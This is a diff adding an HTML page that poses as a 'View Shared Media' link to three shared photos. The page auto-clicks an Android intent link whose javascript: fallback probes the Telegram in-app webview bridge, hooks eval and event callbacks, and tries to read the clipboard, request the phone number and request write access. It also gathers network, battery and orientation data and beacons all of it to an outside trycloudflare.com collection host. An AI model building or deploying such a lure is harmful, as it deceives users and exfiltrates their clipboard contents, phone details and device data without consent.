@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shared Media</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; background: #f0f0f0; padding: 20px; }
+    .card {
+      max-width: 400px; margin: 60px auto; background: #fff;
+      border-radius: 16px; padding: 30px; text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    }
+    .card h2 { font-size: 22px; margin-bottom: 8px; }
+    .card p { color: #666; margin-bottom: 24px; }
+    .btn {
+      display: block; background: #2AABEE; color: #fff; text-decoration: none;
+      padding: 14px; border-radius: 10px; font-size: 16px; font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>View Shared Media</h2>
+  <p>3 photos shared with you</p>
+  <a id="trigger" class="btn" href="intent://x#Intent;scheme=nonexistent99;S.browser_fallback_url=javascript:void(clipboardTest());end">View Photos</a>
+</div>
+<script>
+var COLLECT = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect/clipboard';
+var results = {ts: Date.now(), tests: {}};
+
+function send(label, data) {
+  results.tests[label] = data;
+  try {
+    navigator.sendBeacon(COLLECT, JSON.stringify({type: 'clipboard_test', label: label, data: data, ts: Date.now()}));
+  } catch(e) {}
+}
+
+function clipboardTest() {
+  document.title = 'Clipboard Test Running...';
+
+  // ---- 1. Enumerate bridge methods in detail ----
+  var bridgeInfo = {};
+  try {
+    if (window.TelegramWebviewProxy) {
+      var methods = [];
+      for (var p in window.TelegramWebviewProxy) methods.push(p);
+      bridgeInfo.methods = methods;
+      bridgeInfo.type = typeof window.TelegramWebviewProxy;
+      // Check for postEvent specifically
+      bridgeInfo.hasPost = typeof window.TelegramWebviewProxy.post;
+      bridgeInfo.hasPostEvent = typeof window.TelegramWebviewProxy.postEvent;
+    } else {
+      bridgeInfo.error = 'TelegramWebviewProxy not found';
+    }
+  } catch(e) { bridgeInfo.error = e.message; }
+  send('bridge_info', bridgeInfo);
+
+  // ---- 2. Set up response listeners BEFORE making calls ----
+
+  // 2a. Hook Telegram.WebView.receiveEvent (Mini App callback path)
+  window.Telegram = window.Telegram || {};
+  window.Telegram.WebView = window.Telegram.WebView || {};
+  window.Telegram.WebView.receiveEvent = function(eventType, eventData) {
+    send('receiveEvent_WebView', {eventType: eventType, eventData: eventData});
+  };
+
+  // 2b. Hook Telegram.WebApp.receiveEvent
+  window.Telegram.WebApp = window.Telegram.WebApp || {};
+  window.Telegram.WebApp.receiveEvent = function(eventType, eventData) {
+    send('receiveEvent_WebApp', {eventType: eventType, eventData: eventData});
+  };
+
+  // 2c. Generic message listener
+  window.addEventListener('message', function(e) {
+    send('postMessage', {origin: e.origin, data: e.data});
+  });
+
+  // 2d. Hook eval to catch any JS injection from native side
+  var origEval = window.eval;
+  window.eval = function(code) {
+    send('eval_called', {code: String(code).substring(0, 500)});
+    return origEval.call(window, code);
+  };
+
+  // 2e. MutationObserver to detect any DOM injection (native might inject script tags)
+  var observer = new MutationObserver(function(mutations) {
+    for (var i = 0; i < mutations.length; i++) {
+      if (mutations[i].addedNodes.length) {
+        for (var j = 0; j < mutations[i].addedNodes.length; j++) {
+          var node = mutations[i].addedNodes[j];
+          if (node.tagName === 'SCRIPT') {
+            send('script_injected', {src: node.src, text: (node.textContent || '').substring(0, 500)});
+          }
+        }
+      }
+    }
+  });
+  observer.observe(document.documentElement, {childList: true, subtree: true});
+
+  // ---- 3. Try clipboard reads via bridge - multiple formats ----
+
+  // Small delay to ensure listeners are set up
+  setTimeout(function() {
+    var reqId = 'clip_' + Date.now();
+
+    // Format A: post(eventType, eventData) - two args
+    try {
+      TelegramWebviewProxy.post('web_app_read_text_from_clipboard', JSON.stringify({req_id: reqId + '_a'}));
+      send('attempt_A', {status: 'called', format: 'post(type, jsonData)'});
+    } catch(e) { send('attempt_A', {status: 'error', error: e.message}); }
+
+    // Format B: post(jsonString) - single arg with event wrapper
+    try {
+      TelegramWebviewProxy.post(JSON.stringify({eventType: 'web_app_read_text_from_clipboard', eventData: {req_id: reqId + '_b'}}));
+      send('attempt_B', {status: 'called', format: 'post(JSON{eventType,eventData})'});
+    } catch(e) { send('attempt_B', {status: 'error', error: e.message}); }
+
+    // Format C: post(type/data) - slash separated
+    try {
+      TelegramWebviewProxy.post('web_app_read_text_from_clipboard/' + JSON.stringify({req_id: reqId + '_c'}));
+      send('attempt_C', {status: 'called', format: 'post(type/jsonData)'});
+    } catch(e) { send('attempt_C', {status: 'error', error: e.message}); }
+
+    // Format D: post with empty data
+    try {
+      TelegramWebviewProxy.post('web_app_read_text_from_clipboard', '');
+      send('attempt_D', {status: 'called', format: 'post(type, empty)'});
+    } catch(e) { send('attempt_D', {status: 'error', error: e.message}); }
+
+    // Format E: Try other interesting events too
+    try {
+      TelegramWebviewProxy.post('web_app_request_phone', JSON.stringify({}));
+      send('attempt_phone', {status: 'called'});
+    } catch(e) { send('attempt_phone', {status: 'error', error: e.message}); }
+
+    // Format F: Try requesting write access (auto-approve?)
+    try {
+      TelegramWebviewProxy.post('web_app_request_write_access', JSON.stringify({}));
+      send('attempt_write_access', {status: 'called'});
+    } catch(e) { send('attempt_write_access', {status: 'error', error: e.message}); }
+
+  }, 100);
+
+  // ---- 4. Try Web Clipboard API directly ----
+  setTimeout(function() {
+    // 4a. navigator.clipboard.readText()
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText().then(function(text) {
+          send('clipboard_api_read', {status: 'success', text: text});
+        }).catch(function(e) {
+          send('clipboard_api_read', {status: 'error', error: e.message});
+        });
+      } else {
+        send('clipboard_api_read', {status: 'not_available'});
+      }
+    } catch(e) { send('clipboard_api_read', {status: 'exception', error: e.message}); }
+
+    // 4b. document.execCommand('paste') trick
+    try {
+      var ta = document.createElement('textarea');
+      ta.style.cssText = 'position:fixed;top:-9999px';
+      document.body.appendChild(ta);
+      ta.focus();
+      var pasted = document.execCommand('paste');
+      send('execCommand_paste', {status: pasted ? 'success' : 'failed', value: ta.value || '(empty)'});
+      ta.remove();
+    } catch(e) { send('execCommand_paste', {status: 'error', error: e.message}); }
+  }, 300);
+
+  // ---- 5. Try sensor/network data while we're at it ----
+  setTimeout(function() {
+    // Network info
+    try {
+      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        send('network', {type: conn.type, effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt});
+      } else {
+        send('network', {status: 'not_available'});
+      }
+    } catch(e) { send('network', {status: 'error', error: e.message}); }
+
+    // Battery
+    try {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function(b) {
+          send('battery', {level: b.level, charging: b.charging});
+        }).catch(function(e) { send('battery', {status: 'error', error: e.message}); });
+      }
+    } catch(e) {}
+
+    // Device orientation (one sample)
+    var orientSent = false;
+    window.addEventListener('deviceorientation', function(e) {
+      if (!orientSent) {
+        orientSent = true;
+        send('orientation', {alpha: e.alpha, beta: e.beta, gamma: e.gamma});
+      }
+    });
+  }, 400);
+
+  // ---- 6. Wait for all responses, then show results ----
+  setTimeout(function() {
+    // Send final summary
+    navigator.sendBeacon(COLLECT, JSON.stringify({type: 'clipboard_test_final', results: results, ts: Date.now()}));
+
+    // Show results on screen
+    document.title = 'Clipboard Test Complete';
+    var el = document.body;
+    el.style.background = '#0d1117';
+    el.style.color = '#c9d1d9';
+    el.style.fontFamily = 'ui-monospace, "Courier New", monospace';
+    el.style.fontSize = '11px';
+    el.style.padding = '16px';
+    el.innerHTML = '<h1 style="color:#58a6ff;font-size:18px;margin-bottom:12px">Bridge & Clipboard Test Results</h1>'
+      + '<pre style="white-space:pre-wrap;word-break:break-all;color:#7ee787">'
+      + esc(JSON.stringify(results, null, 2))
+      + '</pre>';
+  }, 3000);
+}
+
+function esc(s) {
+  var d = document.createElement('div');
+  d.textContent = s || '';
+  return d.innerHTML;
+}
+
+// Auto-trigger
+setTimeout(function() {
+  document.getElementById('trigger').click();
+}, 2000);
+</script>
+</body>
+</html>
